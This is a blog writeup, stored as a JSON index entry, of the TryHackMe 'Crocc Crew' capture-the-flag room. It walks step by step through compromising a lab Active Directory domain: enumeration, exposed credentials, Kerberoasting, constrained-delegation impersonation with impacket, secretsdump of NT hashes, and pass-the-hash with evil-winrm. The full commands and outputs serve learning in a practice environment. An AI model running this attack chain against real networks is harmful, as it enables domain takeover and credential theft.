[{"content":"\nRoom Link https://tryhackme.com/room/crocccrew Difficulty Insane Points 120 Summary This room is a full Active Directory attack simulation focused on realistic enterprise privilege escalation. We start with minimal external access, enumerate exposed services, and identify weak entry points into the network. After obtaining low-privileged AD credentials, we move into internal enumeration, discover misconfigurations in Kerberos Constrained Delegation, and exploit it to impersonate privileged users. From there, we extract NT hashes and Kerberos keys, gain full Domain Administrator access, and ultimately compromise the entire domain.\nThis writeup walks through each stage of the attack: Service \u0026amp; Domain Enumeration Identifying and using exposed credentials SMB \u0026amp; LDAP enumeration Kerberoasting to obtain service account credentials Abuse of Constrained Delegation (S4U2Self \u0026amp; S4U2Proxy) Extracting secrets via secretsdump Achieving full Domain Admin access If you\u0026rsquo;re studying Kerberos internals, realistic AD compromise paths, or red team post-exploitation, this room is an excellent hands-on challenge\nInitial scan Nmap Command:\nnmap -sC -sV -sS 10.10.236.0 Output:\n┌──(kali㉿kali)-[~] └─$ sudo nmap -sC -sV -sS 10.10.236.0 [sudo] password for kali: Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 14:46 IST Stats: 0:03:12 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 85.71% done; ETC: 14:49 (0:00:02 remaining) Nmap scan report for 10.10.236.0 Host is up (0.24s latency). Not shown: 986 closed tcp ports (reset) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-06-04 09:19:45Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 3389/tcp open ms-wbt-server Microsoft Terminal Services |_ssl-date: 2025-06-04T09:22:02+00:00; 0s from scanner time. | ssl-cert: Subject: commonName=DC.COOCTUS.CORP | Not valid before: 2025-06-03T08:40:24 |_Not valid after: 2025-12-03T08:40:24 | rdp-ntlm-info: | Target_Name: COOCTUS | NetBIOS_Domain_Name: COOCTUS | NetBIOS_Computer_Name: DC | DNS_Domain_Name: COOCTUS.CORP | DNS_Computer_Name: DC.COOCTUS.CORP | Product_Version: 10.0.17763 |_ System_Time: 2025-06-04T09:19:57+00:00 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results:\n| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2025-06-04T09:19:58 |_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 331.93 seconds We can see there is a website running on port 80. Let’s try fuzzing it.\nWeb fuzzing Command:\nffuf -u http://10.10.96.32/FUZZ -w /usr/share/wordlists/dirb/common.txt Output (trimmed):\nindex.html [Status: 200, Size: 5342323] robots.txt [Status: 200, Size: 70] robots.txt User-Agent: * Disallow: /robots.txt /db-config.bak /backdoor.php Found: /db-config.bak — contains server credentials:\n$servername = \u0026#34;db.cooctus.corp\u0026#34;; $username = \u0026#34;C00ctusAdm1n\u0026#34;; $password = \u0026#34;B4dt0th3b0n3\u0026#34;; Tried rpcclient — nothing interesting returned, then attempted RDP.\nRDP and found credentials RDP connect attempt:\nrdesktop -f -u \u0026#34;\u0026#34; 10.10.23.38 RDP warned about an invalid certificate (self-signed). Connected and found credentials in the lockscreen wallpaper:\nVisitor GuestLogin! Use these credentials for credential spray / access.\nSMB access with credentials CrackMapExec:\ncrackmapexec smb 10.10.23.38 -u Visitor -p GuestLogin! --users Output shows COOCTUS.CORP\\Visitor:GuestLogin! is valid.\nEnumerating shares:\nsmbclient -L //10.10.23.38 -U \u0026#34;Visitor\u0026#34; Accessible shares: ADMIN$, C$, Home, IPC$, NETLOGON, SYSVOL.\nAccess Home share:\nsmbclient //10.10.175.192/Home -U \u0026#34;Visitor\u0026#34; Found user.txt:\nTHM{Gu3st_******} LDAP / AD enumeration Used enum4linux-ng and ldapdomaindump to dump AD details.\nldapdomaindump 10.10.175.192 -u \u0026#34;COOCTUS\\Visitor\u0026#34; -p \u0026#39;GuestLogin!\u0026#39; Found password-reset account configured with TRUSTED_TO_AUTH_FOR_DELEGATION! — supports constrained delegation theory.\nKerberos — GetUserSPNs \u0026amp; Crack TGS GetUserSPNs:\nimpacket-GetUserSPNs COOCTUS.CORP/Visitor:GuestLogin! -request -dc-ip 10.10.96.32 -outputfile TGS.txt Returned SPN: HTTP/dc.cooctus.corp password-reset (constrained).\nCracked TGS with John:\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash_crocc Result: resetpassword cracked.\nDelegation discovery and abuse Find delegation:\nimpacket-findDelegation -debug COOCTUS.CORP/password-reset:resetpassword -dc-ip 10.10.96.32 Delegation rights to: oakley/DC.COOCTUS.CORP.\nGet ST (impersonate Administrator):\nimpacket-getST -spn oakley/DC.COOCTUS.CORP -impersonate Administrator \u0026#34;COOCTUS.CORP/password-reset:resetpassword\u0026#34; -dc-ip 10.10.96.32 Saved ticket: Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache.\nSet the ticket for local usage:\nexport KRB5CCNAME=Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache Added host entry for DC.COOCTUS.CORP to /etc/hosts:\n10.10.175.192 DC.COOCTUS.CORP Retrieving secrets (secretsdump) Used impacket secretsdump with Kerberos ticket:\nimpacket-secretsdump -k -no-pass DC.COOCTUS.CORP Key results (trimmed):\nAdministrator:500:...:add41095f1fb0405b32f70a489de022d::: ... (many domain accounts and Kerberos keys) Administrator NT hash: add41095f1fb0405b32f70a489de022d.\nAdministrator access with Evil-WinRM evil-winrm -i 10.10.96.32 -u Administrator -H \u0026#39;add41095f1fb0405b32f70a489de022d\u0026#39; Got Administrator shell.\nFlags User flag (from Home share):\nTHM{Gu3st_******} Privilege escalation flags (found on system):\nTHM{0n-************-DA} THM{Wh4t-t0-d0*******************} Root flag:\nFound in C:\\PerfLogs\\Admin\\root.txt:\nTHM{Cr0cc*****************} Conclusion We enumerated the host, found web and RDP entry points, discovered credentials via an exposed backup file and RDP wallpaper, authenticated to SMB, enumerated AD, abused constrained delegation to impersonate Administrator, retrieved NT hashes and Kerberos keys with secretsdump, and obtained Administrator access to read flags.\nThe END.\n","permalink":"https://n0rmh3ll.github.io/posts/crocc-crew/","summary":"\u003cp\u003e\u003cimg alt=\"alt text\" loading=\"lazy\" src=\"/posts/crocc-crew/hero.png\"\u003e\u003c/p\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e\u003cstrong\u003eRoom Link\u003c/strong\u003e\u003c/th\u003e\n          \u003cth\u003e\u003ca href=\"https://tryhackme.com/room/crocccrew\"\u003ehttps://tryhackme.com/room/crocccrew\u003c/a\u003e\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003cstrong\u003eDifficulty\u003c/strong\u003e\u003c/td\u003e\n          \u003ctd\u003eInsane\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003cstrong\u003ePoints\u003c/strong\u003e\u003c/td\u003e\n          \u003ctd\u003e120\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch2 id=\"summary\"\u003eSummary\u003c/h2\u003e\n\u003cp\u003eThis room is a full Active Directory attack simulation focused on realistic enterprise privilege escalation. We start with minimal external access, enumerate exposed services, and identify weak entry points into the network. After obtaining low-privileged AD credentials, we move into internal enumeration, discover misconfigurations in Kerberos Constrained Delegation, and exploit it to impersonate privileged users. From there, we extract NT hashes and Kerberos keys, gain full Domain Administrator access, and ultimately compromise the entire domain.\u003c/p\u003e","title":"Crocc Crew — TryHackMe Detailed Writeup"}]